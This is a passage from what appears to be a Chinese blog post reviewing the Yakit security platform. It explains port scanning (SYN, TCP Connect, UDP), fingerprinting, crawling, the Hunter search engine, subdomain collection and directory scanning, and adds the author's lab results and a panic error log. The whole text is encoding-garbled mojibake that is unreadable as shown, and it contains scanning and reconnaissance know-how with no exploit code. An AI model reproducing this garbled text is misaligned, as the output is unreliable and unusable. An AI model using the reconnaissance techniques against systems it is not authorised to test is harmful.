‡ä¸»æœºå›åº”äº†ä¸€ä¸ªRST/ACKæ•°æ®åŒ…ï¼Œè¡¨æ˜è¯¥ç«¯å£æ˜¯å…³é—­çš„ã€‚å¦‚æœæ²¡æœ‰ä»»ä½•å“åº”ï¼Œè¡¨æ˜è¯¥ç«¯å£å¯èƒ½è¢«é˜²ç«å¢™æˆ–è€…å…¥ä¾µæ£€æµ‹ç³»ç»Ÿå±è”½äº†ã€‚</li><li>TCP Connectæ‰«æï¼šè¯¥æŠ€æœ¯åˆ©ç”¨TCPåè®®çš„ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹æ¥åˆ¤æ–­ç«¯å£çš„å¼€æ”¾æƒ…å†µã€‚æ‰«ææ¨¡å—å‘ç›®æ ‡ä¸»æœºå‘èµ·ä¸€ä¸ªTCPè¿æ¥è¯·æ±‚ï¼Œå¦‚æœç›®æ ‡ä¸»æœºå›åº”ä¸€ä¸ªSYN/ACKæ•°æ®åŒ…ï¼Œè¡¨æ˜è¯¥ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œæ‰«ææ¨¡å—ä¼šå›åº”ä¸€ä¸ªACKæ•°æ®åŒ…ï¼Œä»¥å»ºç«‹è¿æ¥ã€‚å¦‚æœç›®æ ‡ä¸»æœºå›åº”ä¸€ä¸ªRSTæ•°æ®åŒ…ï¼Œè¡¨æ˜è¯¥ç«¯å£æ˜¯å…³é—­çš„ã€‚å¦‚æœæ²¡æœ‰ä»»ä½•å“åº”ï¼Œè¡¨æ˜è¯¥ç«¯å£å¯èƒ½è¢«é˜²ç«å¢™æˆ–è€…å…¥ä¾µæ£€æµ‹ç³»ç»Ÿå±è”½äº†ã€‚</li><li>UDPæ‰«æï¼šUDPåè®®æ²¡æœ‰åƒTCPåè®®ä¸€æ ·çš„è¿æ¥çŠ¶æ€ï¼Œå› æ­¤UDPæ‰«ææ›´åŠ å¤æ‚ã€‚æ‰«ææ¨¡å—å‘ç›®æ ‡ä¸»æœºå‘é€ä¸€ä¸ªUDPæ•°æ®åŒ…ï¼Œå¦‚æœç›®æ ‡ä¸»æœºå›åº”äº†ä¸€ä¸ªICMPç«¯å£ä¸å¯è¾¾æ•°æ®åŒ…ï¼Œè¡¨æ˜è¯¥ç«¯å£æ˜¯å…³é—­çš„ã€‚å¦‚æœæ²¡æœ‰ä»»ä½•å“åº”ï¼Œè¡¨æ˜è¯¥ç«¯å£å¯èƒ½æ˜¯å¼€æ”¾çš„ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºUDPåè®®æ²¡æœ‰è¿æ¥çŠ¶æ€ï¼Œå› æ­¤UDPæ‰«æçš„å‡†ç¡®æ€§æ¯”TCPæ‰«æè¦ä½ã€‚</li></ul><h3 id="4-1-2-æŒ‡çº¹è¯†åˆ«"><a href="#4-1-2-æŒ‡çº¹è¯†åˆ«" class="headerlink" title="4.1.2 æŒ‡çº¹è¯†åˆ«"></a>4.1.2 æŒ‡çº¹è¯†åˆ«</h3><p><strong>æŒ‡çº¹è¯†åˆ«</strong>æ˜¯é€šè¿‡å¯¹ç›®æ ‡ç³»ç»Ÿä¸Šçš„æœåŠ¡å’Œåº”ç”¨ç¨‹åºè¿›è¡Œè¯†åˆ«ï¼Œæ¥ç¡®å®šç›®æ ‡ç³»ç»Ÿä¸Šçš„æ“ä½œç³»ç»Ÿã€åº”ç”¨ç¨‹åºå’ŒæœåŠ¡ä¿¡æ¯ã€‚æŒ‡çº¹è¯†åˆ«æŠ€æœ¯ä¸»è¦é€šè¿‡è§£æç½‘ç»œæ•°æ®åŒ…å’Œåº”ç”¨ç¨‹åºå“åº”æ¶ˆæ¯æ¥å®ç°ã€‚</p><p>ä»¥ä¸‹æ˜¯å¸¸è§çš„å‡ ç§æŒ‡çº¹è¯†åˆ«æŠ€æœ¯åŠå…¶åŸç†ï¼š</p><ul><li>åº”ç”¨ç¨‹åºæŒ‡çº¹è¯†åˆ«ï¼šè¯¥æŠ€æœ¯é€šè¿‡è§£æåº”ç”¨ç¨‹åºçš„å“åº”æ¶ˆæ¯ï¼Œæ¥ç¡®å®šåº”ç”¨ç¨‹åºçš„ç±»å‹å’Œç‰ˆæœ¬ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼ŒHTTPåè®®ä¸­çš„æœåŠ¡å™¨å“åº”å¤´ä¿¡æ¯å°±åŒ…å«äº†WebæœåŠ¡å™¨çš„ç±»å‹å’Œç‰ˆæœ¬ä¿¡æ¯ã€‚æŒ‡çº¹è¯†åˆ«å™¨é€šè¿‡å‘ç›®æ ‡ç³»ç»Ÿå‘é€HTTPè¯·æ±‚ï¼Œå¹¶è§£æå“åº”æ¶ˆæ¯ä¸­çš„æœåŠ¡å™¨å¤´ä¿¡æ¯ï¼Œæ¥ç¡®å®šWebæœåŠ¡å™¨çš„ç±»å‹å’Œç‰ˆæœ¬ä¿¡æ¯ã€‚</li><li>åè®®æŒ‡çº¹è¯†åˆ«ï¼šè¯¥æŠ€æœ¯é€šè¿‡è§£æç½‘ç»œæ•°æ®åŒ…ï¼Œæ¥ç¡®å®šç›®æ ‡ç³»ç»Ÿæ‰€ä½¿ç”¨çš„åè®®ç±»å‹å’Œç‰ˆæœ¬ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡è§£æTCPæ•°æ®åŒ…çš„TCPæ ‡å¿—ä½ã€TCPé€‰é¡¹å’Œçª—å£å¤§å°ç­‰ä¿¡æ¯ï¼Œå¯ä»¥ç¡®å®šç›®æ ‡ç³»ç»Ÿä¸Šçš„TCP/IPåè®®çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚</li><li>æ“ä½œç³»ç»ŸæŒ‡çº¹è¯†åˆ«ï¼šè¯¥æŠ€æœ¯é€šè¿‡è§£æç½‘ç»œæ•°æ®åŒ…ä¸­çš„ç‰¹å¾ä¿¡æ¯ï¼Œæ¥ç¡®å®šç›®æ ‡ç³»ç»Ÿæ‰€ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿç±»å‹å’Œç‰ˆæœ¬ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡è§£æTCPæ•°æ®åŒ…ä¸­çš„MSSã€TTLã€IP IDç­‰ä¿¡æ¯ï¼Œå¯ä»¥ç¡®å®šç›®æ ‡ç³»ç»Ÿæ‰€ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿç±»å‹å’Œç‰ˆæœ¬ä¿¡æ¯ã€‚</li></ul><h2 id="4-2-ç”¨æ³•"><a href="#4-2-ç”¨æ³•" class="headerlink" title="4.2 ç”¨æ³•"></a>4.2 ç”¨æ³•</h2><ul><li>SYNæ‰«æ</li></ul><p>å…·æœ‰æƒé™è¦æ±‚ï¼ŒLinuxä¸‹å¯åŠ¨yakitéœ€è¦ä»¥rootæƒé™å¯åŠ¨ï¼Œwindowsä¸‹éœ€è¦ç®¡ç†å‘˜æƒé™å¯åŠ¨ï¼Œå¦‚æœä¸æ˜¯ä»¥rootæˆ–è€…ç®¡ç†å‘˜æƒé™å¯åŠ¨ä¼šæŠ¥é”™ã€‚</p><ul><li>æŒ‡çº¹æ‰«æ</li></ul><p>æ— æƒé™è¦æ±‚ï¼Œå¯ç›´æ¥è¿›è¡Œæ‰«æï¼Œè¯†åˆ«ç«¯å£æŒ‡çº¹.</p><ul><li>SYN+æŒ‡çº¹æ‰«æ</li></ul><p>å…·æœ‰æƒé™è¦æ±‚ï¼ŒLinuxä¸‹å¯åŠ¨yakitéœ€è¦ä»¥rootæƒé™å¯åŠ¨ï¼Œwindowsä¸‹éœ€è¦ç®¡ç†å‘˜æƒé™å¯åŠ¨ï¼Œå¦‚æœä¸æ˜¯ä»¥rootæˆ–è€…ç®¡ç†å‘˜æƒé™å¯åŠ¨ä¼šæŠ¥é”™ã€‚</p><h2 id="4-3-å®éªŒéªŒè¯ï¼ˆEXï¼‰"><a href="#4-3-å®éªŒéªŒè¯ï¼ˆEXï¼‰" class="headerlink" title="4.3 å®éªŒéªŒè¯ï¼ˆEXï¼‰"></a>4.3 å®éªŒéªŒè¯ï¼ˆEXï¼‰</h2><p>å®éªŒéªŒè¯ï¼šä¸å¦‚nmapå¥½ç”¨ã€‚</p><p>æˆ‘æ‰«æçš„æ˜¯macä¸Šè™šæ‹Ÿç½‘å¡bridge100ä¸Šçš„192.168.155.34æœºå­ä¸Šå¼€æ”¾ç«¯å£å’ŒæŒ‡çº¹çš„æƒ…å†µã€‚ä¸€å¼€å§‹è·³è¿‡ä¸»æœºå­˜è´§æ£€æµ‹çš„æ—¶å€™è€æ˜¯ä¼šæŠ¥ä¸‹é¢çš„é”™ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>WARN<span class="token punctuation">]</span> <span class="token number">2024</span>-12-24 <span class="token number">15</span>:07:45 <span class="token punctuation">[</span>grpc_http_request_debug:173<span class="token punctuation">]</span> execute debug script failed: <span class="token builtin class-name">exec</span> yakc with code failed: Panic Stack:__yak_main__<span class="token number">429</span> <span class="token operator">|</span>         synscan.concurrent<span class="token punctuation">(</span>synConcurrent<span class="token punctuation">)</span>, <span class="token number">430</span> <span class="token operator">|</span>         synscan.iface<span class="token punctuation">(</span>synScanNetInterface<span class="token punctuation">)</span>, <span class="token number">431</span> <span class="token operator">|</span>     <span class="token punctuation">)</span> <span class="token number">432</span> <span class="token operator">&gt;</span>     die<span class="token punctuation">(</span>err<span class="token punctuation">)</span>              ^~~~~ <span class="token number">433</span> <span class="token operator">|</span>  <span class="token number">434</span> <span class="token operator">|</span>     res, err :<span class="token operator">=</span> servicescan.ScanFromSynResult<span class="token punctuation">(</span>synResults, opts<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token number">435</span> <span class="token operator">|</span>     die<span class="token punctuation">(</span>err<span class="token punctuation">)</span>YakVM Panic: no valid <span class="token function">ping</span> results found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å•ç‹¬è¿›è¡Œsynæ‰«ææˆ–æŒ‡çº¹æ‰«æçš„æ—¶å€™ï¼Œè¯†åˆ«çš„ç«¯å£æ€»æ˜¯ä¸å…¨ã€‚</p><p>æœ€åé€šè¿‡è®¾ç½®ä¸è·³è¿‡ä¸»æœºå­˜æ´»+syn+æŒ‡çº¹æ‰«æï¼Œå¾—åˆ°äº†è¾ƒä¸ºå…¨é¢çš„ç»“æœã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2009.48.08.png" alt="æˆªå±2024-12-25 09.48.08" style="zoom:50%;"><p>æœåŠ¡è¯†åˆ«çš„æƒ…å†µå¹¶ä¸å¥½ã€‚</p><h1 id="äº”ã€åŸºç¡€çˆ¬è™«"><a href="#äº”ã€åŸºç¡€çˆ¬è™«" class="headerlink" title="äº”ã€åŸºç¡€çˆ¬è™«"></a>äº”ã€åŸºç¡€çˆ¬è™«</h1><h2 id="5-1-èƒŒæ™¯"><a href="#5-1-èƒŒæ™¯" class="headerlink" title="5.1 èƒŒæ™¯"></a>5.1 èƒŒæ™¯</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œçˆ¬è™«æ˜¯ä¸»åŠ¨æ¼æ´æ‰«æä¸­æå…¶é‡è¦çš„ä¸€ç¯ã€‚åœ¨æ¼æ´æ‰«æä¸­ï¼Œçˆ¬è™«è¢«ç”¨ä½œä¸€ç§æ•°æ®æ”¶é›†å·¥å…·ï¼Œç”¨äºè·å–ç›®æ ‡ç³»ç»Ÿçš„ä¿¡æ¯ä»¥å¸®åŠ©æˆ‘ä»¬å‘ç°æ¼æ´ã€‚</p><p>Yakit æ¼æ´æ‰«æä¸­çš„<code>åŸºç¡€çˆ¬è™«</code>é€šå¸¸åŒ…å«ä»¥ä¸‹ä¸‰ä¸ªä¸»è¦æ­¥éª¤ï¼š</p><ul><li>ç½‘ç«™çˆ¬å–ï¼šçˆ¬è™«é¦–å…ˆä¼šçˆ¬å–ç›®æ ‡ç³»ç»Ÿä¸­çš„ç½‘ç«™ï¼Œå¹¶å°†ç½‘ç«™çš„æºä»£ç å’Œç›¸å…³ä¿¡æ¯å­˜å‚¨åˆ°æ‰«æå™¨çš„æ•°æ®åº“ä¸­ã€‚è¿™äº›ä¿¡æ¯åŒ…æ‹¬ç½‘ç«™çš„URLã€é¡µé¢ç»“æ„ã€è¡¨å•ã€è„šæœ¬å’Œå…¶ä»–ä¸ç½‘ç«™ç›¸å…³çš„ä¿¡æ¯ã€‚</li><li>çˆ¬å–æ•°æ®åˆ†æï¼šåŸºç¡€çˆ¬è™«ä¼šå¯¹çˆ¬å–çš„ç½‘ç«™æ•°æ®è¿›è¡Œåˆ†æï¼Œå¹¶ä»ä¸­æå–ç›¸å…³çš„ä¿¡æ¯ï¼Œå¦‚ç½‘ç«™çš„ç»“æ„ã€é“¾æ¥ã€è¡¨å•å’Œå‚æ•°ç­‰ã€‚</li><li>æ¼æ´æ£€æµ‹ï¼šåŸºç¡€çˆ¬è™«ä¼šä½¿ç”¨çˆ¬å–åˆ°çš„ä¿¡æ¯æ ¹æ®åŠ è½½çš„ç›¸å…³çš„Yakitæ’ä»¶è¿›è¡Œæ¼æ´æ‰«æï¼Œå¹¶æ ¹æ®æ‰«æç»“æœæä¾›ç›¸åº”çš„æ¼æ´æŠ¥å‘Šã€‚</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ¼æ´æ‰«æä¸­çš„çˆ¬è™«ä¸æ™®é€šçš„çˆ¬è™«æœ‰æ‰€ä¸åŒã€‚å®ƒå¹¶ä¸æ˜¯ä¸ºäº†æŠ“å–ç½‘ç«™ä¸Šçš„æ•°æ®è€Œè®¾è®¡çš„ï¼Œè€Œæ˜¯ä¸ºäº†è·å–ç½‘ç«™ç»“æ„å’Œå‚æ•°ç­‰ä¿¡æ¯ä»¥å¸®åŠ©æˆ‘ä»¬å‘ç°æ¼æ´ã€‚åŒæ—¶ï¼Œè¿›è¡Œæ¼æ´æ‰«ææ—¶éœ€è¦éµå®ˆç›¸å…³çš„æ³•å¾‹å’Œé“å¾·è§„èŒƒï¼Œä¸èƒ½è¿›è¡Œæœªç»æˆæƒçš„æ”»å‡»è¡Œä¸ºã€‚</p><h2 id="5-2-å…¶ä»–å‚æ•°"><a href="#5-2-å…¶ä»–å‚æ•°" class="headerlink" title="5.2 å…¶ä»–å‚æ•°"></a>5.2 å…¶ä»–å‚æ•°</h2><ul><li>è®¾ç½®ä»£ç†ï¼šæœ‰äº›ç½‘ç«™è®¿é—®ä¸åˆ°çš„ï¼Œå¯ä»¥åŠ å…¥ä»£ç†è¿›è¡Œè®¿é—®ï¼Œæ ¼å¼ä¸º<a href="http://127.0.0.1:7890/">http://127.0.0.1:7890</a> æˆ–è€… socks5://127.0.0.1:7890</li><li>è¶…æ—¶æ—¶é—´ï¼šæ¯ä¸ªè¯·æ±‚çš„æœ€å¤§è¶…æ—¶æ—¶é—´</li><li>æœ€å¤§æ·±åº¦ï¼šè®¾ç½®çˆ¬è™«çš„æœ€å¤§æ·±åº¦ï¼ˆé€»è¾‘æ·±åº¦ï¼Œå¹¶ä¸æ˜¯çº§æ•°ï¼‰</li><li>å¹¶å‘é‡ï¼šçˆ¬è™«çš„å¹¶å‘è¯·æ±‚é‡ï¼ˆå¯ä»¥ç†è§£ä¸ºçº¿ç¨‹æ•°ï¼‰</li><li>æœ€å¤§URLæ•°ï¼šçˆ¬è™«è·å–åˆ°çš„æœ€å¤§é‡URLï¼ˆè¿™ä¸ªé€‰é¡¹ä¸€èˆ¬ç”¨æ¥é™åˆ¶æ— é™åˆ¶çš„çˆ¬è™«ï¼Œä¸€èˆ¬ä¸éœ€è¦æ”¹åŠ¨ï¼‰</li><li>æœ€å¤§è¯·æ±‚æ•°ï¼šæœ¬æ¬¡çˆ¬è™«æœ€å¤šå‘å‡ºå¤šå°‘ä¸ªè¯·æ±‚ï¼Ÿï¼ˆä¸€èˆ¬ç”¨äºé™åˆ¶çˆ¬è™«è¡Œä¸ºï¼Œä¸€èˆ¬ä¸éœ€è¦æ”¹åŠ¨ï¼‰</li></ul><h2 id="5-3-å®éªŒéªŒè¯ï¼ˆEXï¼‰"><a href="#5-3-å®éªŒéªŒè¯ï¼ˆEXï¼‰" class="headerlink" title="5.3 å®éªŒéªŒè¯ï¼ˆEXï¼‰"></a>5.3 å®éªŒéªŒè¯ï¼ˆEXï¼‰</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2010.02.53.png" style="zoom:50%;"><p>  login.htmléƒ½æ²¡æœ‰çˆ¬åˆ°ï¼Œæ•ˆæœä¸æ˜¯å¾ˆå¥½ã€‚</p><h1 id="å…­ã€ç©ºé—´å¼•æ“ï¼šHunter"><a href="#å…­ã€ç©ºé—´å¼•æ“ï¼šHunter" class="headerlink" title="å…­ã€ç©ºé—´å¼•æ“ï¼šHunter"></a>å…­ã€ç©ºé—´å¼•æ“ï¼šHunter</h1><h2 id="6-1-æ¦‚è¿°"><a href="#6-1-æ¦‚è¿°" class="headerlink" title="6.1 æ¦‚è¿°"></a>6.1 æ¦‚è¿°</h2><p>ç½‘ç»œç©ºé—´æœç´¢å¼•æ“æ˜¯ä¸€ç§ä¸“é—¨ç”¨äºåœ¨ç½‘ç»œä¸Šå‘ç°å’Œåˆ†æç‰¹å®šä¿¡æ¯çš„æœç´¢å¼•æ“ï¼Œä¹Ÿæ˜¯æ¸—é€æµ‹è¯•ä¸­ä¿¡æ¯æ”¶é›†çš„æ–¹å¼ä¹‹ä¸€ã€‚</p><p>ä¸ä¼ ç»Ÿæœç´¢å¼•æ“ä¸åŒï¼Œç½‘ç»œç©ºé—´æœç´¢å¼•æ“çš„ç›®æ ‡æ˜¯æœç´¢ç½‘ç»œä¸Šçš„éå¸¸è§„èµ„æºï¼Œä¾‹å¦‚ç½‘ç»œæœåŠ¡å™¨ã€ç«¯å£ã€IPåœ°å€ã€æ–‡ä»¶ã€ç›®å½•ã€æ•°æ®åº“ç­‰ç­‰ã€‚å®ƒå¯ä»¥å¸®åŠ©ä¼ä¸šã€æ”¿åºœæœºæ„ã€å®‰å…¨å›¢é˜Ÿç­‰è¿›è¡Œç½‘ç»œæƒ…æŠ¥æ”¶é›†å’Œå¨èƒæƒ…æŠ¥åˆ†æã€‚</p><p>é™¤äº†hunterå¤–ï¼Œè¿˜æœ‰å¾ˆå¤šåŒç±»å‹çš„ç©ºé—´æœç´¢å¼•æ“ï¼Œåœ¨Yakitæ’ä»¶å•†åº—ä¸­ä¹Ÿæœ‰ç±»ä¼¼çš„æ’ä»¶ã€‚</p><h2 id="6-2-ä½¿ç”¨"><a href="#6-2-ä½¿ç”¨" class="headerlink" title="6.2 ä½¿ç”¨"></a>6.2 ä½¿ç”¨</h2><p>é€šè¿‡é…ç½®hunterçš„apiKeyå’Œç”¨æˆ·åå¹¶è¾“å…¥hunterè¯­æ³•æ¥è·å–ç›®æ ‡èµ„äº§ï¼Œå¹¶ä¸”å·¦è¾¹æä¾›pocæ’ä»¶è¿›è¡Œæ‰¹é‡æ£€æµ‹ã€‚</p><h2 id="6-3-å®éªŒéªŒè¯ï¼ˆEXï¼‰"><a href="#6-3-å®éªŒéªŒè¯ï¼ˆEXï¼‰" class="headerlink" title="6.3 å®éªŒéªŒè¯ï¼ˆEXï¼‰"></a>6.3 å®éªŒéªŒè¯ï¼ˆEXï¼‰</h2><p>ç¼ºå°‘ç©ºé—´å¼•æ“çš„apikeyï¼Œæš‚æœªåšå®éªŒéªŒè¯ã€‚</p><h1 id="ä¸ƒã€å­åŸŸåæ”¶é›†"><a href="#ä¸ƒã€å­åŸŸåæ”¶é›†" class="headerlink" title="ä¸ƒã€å­åŸŸåæ”¶é›†"></a>ä¸ƒã€å­åŸŸåæ”¶é›†</h1><h2 id="7-1-èƒŒæ™¯"><a href="#7-1-èƒŒæ™¯" class="headerlink" title="7.1 èƒŒæ™¯"></a>7.1 èƒŒæ™¯</h2><p>å­åŸŸåæ”¶é›†æ˜¯æŒ‡é€šè¿‡å„ç§æŠ€æœ¯æ‰‹æ®µï¼Œæ”¶é›†æŸä¸ªä¸»åŸŸåä¸‹æ‰€æœ‰çš„å­åŸŸååˆ—è¡¨ã€‚å­åŸŸåæ˜¯æŒ‡åœ¨ä¸»åŸŸåå‰é¢æ·»åŠ ä¸€çº§æˆ–å¤šçº§åç§°çš„åŸŸåã€‚ä¾‹å¦‚ï¼Œå¯¹äºä¸»åŸŸåexample.comï¼Œå…¶å­åŸŸåå¯ä»¥æ˜¯<a href="http://www.example.comã€mail.example.comã€blog.example.com/">www.example.comã€mail.example.comã€blog.example.com</a> ç­‰ç­‰ã€‚</p><p>å­åŸŸåæ”¶é›†çš„åŸç†ä¸»è¦æ¶‰åŠä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p><ul><li>åŸŸåè§£æï¼šåŸŸåè§£ææ˜¯å°†åŸŸåè§£æä¸ºå¯¹åº”IPåœ°å€çš„è¿‡ç¨‹ã€‚åœ¨å­åŸŸåæ”¶é›†è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥é€šè¿‡æŸ¥è¯¢ä¸»åŸŸåçš„DNSè®°å½•æ¥è·å–å…¶ä¸‹çš„å­åŸŸååˆ—è¡¨ã€‚é€šè¿‡é€’å½’æŸ¥è¯¢ï¼Œå¯ä»¥è·å–ä¸»åŸŸåä¸‹æ‰€æœ‰çš„å­åŸŸåã€‚</li><li>æ¨¡ç³ŠåŒ¹é…ï¼šå¯¹äºä¸€äº›ä¸»åŸŸåï¼Œå¯èƒ½ä¼šå­˜åœ¨ä¸€äº›å¸¸è§çš„å­åŸŸåï¼Œä¾‹å¦‚wwwã€mailã€ftpç­‰ç­‰ã€‚é€šè¿‡åœ¨ä¸»åŸŸåå‰é¢æ·»åŠ è¿™äº›å¸¸è§çš„å­åŸŸåï¼Œå¯ä»¥å¾—åˆ°å¯èƒ½å­˜åœ¨çš„å­åŸŸååˆ—è¡¨ã€‚ä¾‹å¦‚ï¼Œå¯¹äºä¸»åŸŸåexample.comï¼Œå¯ä»¥å°è¯•æŸ¥è¯¢<a href="http://www.example.comã€mail.example.com/">www.example.comã€mail.example.com</a> ç­‰ç­‰ã€‚</li><li>çˆ†ç ´æŠ€æœ¯ï¼šçˆ†ç ´æŠ€æœ¯æ˜¯æŒ‡åˆ©ç”¨ç¨‹åºè‡ªåŠ¨åŒ–çš„æ–¹å¼ï¼Œå¯¹åŸŸåè¿›è¡Œå¤§é‡çš„çŒœæµ‹å’Œå°è¯•ï¼Œä»¥è·å–å…¶ä¸‹çš„å­åŸŸååˆ—è¡¨ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨å­—å…¸æ–‡ä»¶å¯¹ä¸»åŸŸåè¿›è¡Œçˆ†ç ´ï¼Œå°è¯•å„ç§å¯èƒ½å­˜åœ¨çš„å­åŸŸåã€‚</li><li>æœç´¢å¼•æ“ï¼šé€šè¿‡æœç´¢å¼•æ“çš„æ–¹å¼ï¼Œå¯ä»¥æœç´¢åˆ°ä¸»åŸŸåä¸‹å¯èƒ½å­˜åœ¨çš„å­åŸŸåã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨æœç´¢å¼•æ“çš„â€œsite:example.comâ€å‘½ä»¤æ¥æœç´¢æ‰€æœ‰ä»¥example.comç»“å°¾çš„å­åŸŸåã€‚</li></ul><h2 id="7-2-ä½¿ç”¨æ–¹æ³•"><a href="#7-2-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="7.2 ä½¿ç”¨æ–¹æ³•"></a>7.2 ä½¿ç”¨æ–¹æ³•</h2><p>åœ¨è¾“å…¥æ¡†è¾“å…¥è¦æµ‹è¯•çš„ç›®æ ‡çš„æ ¹åŸŸåï¼Œç„¶åç‚¹å‡»æ‰§è¡Œå³å¯å¼€å§‹çˆ†ç ´ï¼Œçˆ†ç ´çš„ç»“æœä¼šåœ¨ä¸‹æ–¹å±•ç¤ºï¼Œä¹Ÿä¼šåœ¨æ•°æ®åº“å…¥åº“ã€‚</p><h2 id="7-3-å®éªŒéªŒè¯ï¼ˆEXï¼‰"><a href="#7-3-å®éªŒéªŒè¯ï¼ˆEXï¼‰" class="headerlink" title="7.3 å®éªŒéªŒè¯ï¼ˆEXï¼‰"></a>7.3 å®éªŒéªŒè¯ï¼ˆEXï¼‰</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2010.14.06.png" style="zoom:50%;"><h1 id="å…«ã€ç»¼åˆç›®å½•æ‰«æä¸çˆ†ç ´"><a href="#å…«ã€ç»¼åˆç›®å½•æ‰«æä¸çˆ†ç ´" class="headerlink" title="å…«ã€ç»¼åˆç›®å½•æ‰«æä¸çˆ†ç ´"></a>å…«ã€ç»¼åˆç›®å½•æ‰«æä¸çˆ†ç ´</h1><h2 id="8-1-èƒŒæ™¯"><a href="#8-1-èƒŒæ™¯" class="headerlink" title="8.1 èƒŒæ™¯"></a>8.1 èƒŒæ™¯</h2><p>ç›®å½•æ‰«ææ˜¯ä¸€ç§å¸¸ç”¨çš„Webåº”ç”¨ç¨‹åºå®‰å…¨æµ‹è¯•æŠ€æœ¯ï¼Œç”¨äºå‘ç°Webåº”ç”¨ç¨‹åºä¸­å­˜åœ¨çš„å¯èƒ½å­˜åœ¨çš„æ¼æ´å’Œå¼±ç‚¹ã€‚å…¶åŸç†æ˜¯é€šè¿‡å¯¹Webåº”ç”¨ç¨‹åºä¸­çš„ç›®å½•å’Œæ–‡ä»¶è¿›è¡Œéå†ï¼Œæ¥å‘ç°å¯èƒ½å­˜åœ¨çš„å®‰å…¨æ¼æ´å’Œé£é™©ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œç›®å½•æ‰«æå·¥å…·ä¼šé€šè¿‡ç¨‹åºè‡ªåŠ¨åŒ–çš„æ–¹å¼ï¼Œç”Ÿæˆå¤§é‡çš„HTTPè¯·æ±‚ï¼Œå¹¶è¯·æ±‚Webåº”ç”¨ç¨‹åºä¸­çš„æ‰€æœ‰å¯èƒ½å­˜åœ¨çš„ç›®å½•å’Œæ–‡ä»¶ã€‚å½“Webåº”ç”¨ç¨‹åºè¿”å›200çŠ¶æ€ç æ—¶ï¼Œè¡¨ç¤ºè¯¥ç›®å½•æˆ–æ–‡ä»¶å­˜åœ¨ï¼›å½“Webåº”ç”¨ç¨‹åºè¿”å›404çŠ¶æ€ç æ—¶ï¼Œè¡¨ç¤ºè¯¥ç›®å½•æˆ–æ–‡ä»¶ä¸å­˜åœ¨ã€‚é€šè¿‡å¯¹Webåº”ç”¨ç¨‹åºè¿”å›çš„çŠ¶æ€ç è¿›è¡Œåˆ†æï¼Œç›®å½•æ‰«æå·¥å…·å¯ä»¥ç¡®å®šå“ªäº›ç›®å½•æˆ–æ–‡ä»¶æ˜¯å­˜åœ¨çš„ï¼Œå“ªäº›æ˜¯ä¸å­˜åœ¨çš„ã€‚</p><p>åœ¨ç›®å½•æ‰«æè¿‡ç¨‹ä¸­ï¼Œç›®å½•æ‰«æé€šå¸¸ä¼šä½¿ç”¨å­—å…¸æ–‡ä»¶ï¼ŒYakitå†…ç½®äº†ä¸€äº›å¸¸è§å­—å…¸ï¼Œè¿™äº›å­—å…¸æ–‡ä»¶åŒ…å«äº†ä¸€äº›å¸¸è§çš„ç›®å½•å’Œæ–‡ä»¶è·¯å¾„ï¼Œç”¨äºå¸®åŠ©ç›®å½•æ‰«æå·¥å…·ç”ŸæˆHTTPè¯·æ±‚ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡è°ƒæ•´çº¿ç¨‹çš„æ–¹å¼ï¼ŒåŒæ—¶å‘é€å¤šä¸ªHTTPè¯·æ±‚ï¼ŒåŠ å¿«æ‰«æé€Ÿåº¦ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç›®å½•æ‰«æå·¥å…·çš„æ‰«æç»“æœå¹¶ä¸ä¸€å®šæ˜¯å‡†ç¡®çš„ï¼Œå› ä¸ºWebåº”ç”¨ç¨‹åºå¯èƒ½å­˜åœ¨æŸäº›å®‰å…¨æœºåˆ¶æ¥é˜²æ­¢ç›®å½•æ‰«æå·¥å…·çš„æ”»å‡»ï¼Œä¾‹å¦‚IPå°é”ã€User-Agentè¿‡æ»¤ç­‰ã€‚å› æ­¤ï¼Œåœ¨ä½¿ç”¨ç›®å½•æ‰«æå·¥å…·è¿›è¡Œå®‰å…¨æµ‹è¯•æ—¶ï¼Œéœ€è¦ç»“åˆå…¶ä»–çš„æµ‹è¯•æŠ€æœ¯ï¼Œå¦‚æ‰‹å·¥æµ‹è¯•ã€æ¼æ´æ‰«æç­‰ï¼Œä»¥ç¡®ä¿æµ‹è¯•çš„å…¨é¢æ€§å’Œå‡†ç¡®æ€§ã€‚</p><h2 id="8-2-ä½¿ç”¨æ–¹æ³•"><a href="#8-2-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="8.2 ä½¿ç”¨æ–¹æ³•"></a>8.2 ä½¿ç”¨æ–¹æ³•</h2><p>ç‚¹å‡»<code>æ£€æŸ¥é¡¹ç›®</code>æ–‡æœ¬æ¡†ï¼Œé€‰æ‹©æƒ³è¦ä½¿ç”¨çš„å­—å…¸ï¼Œåœ¨æ–‡æœ¬æ¡†è¾“å…¥ç›®æ 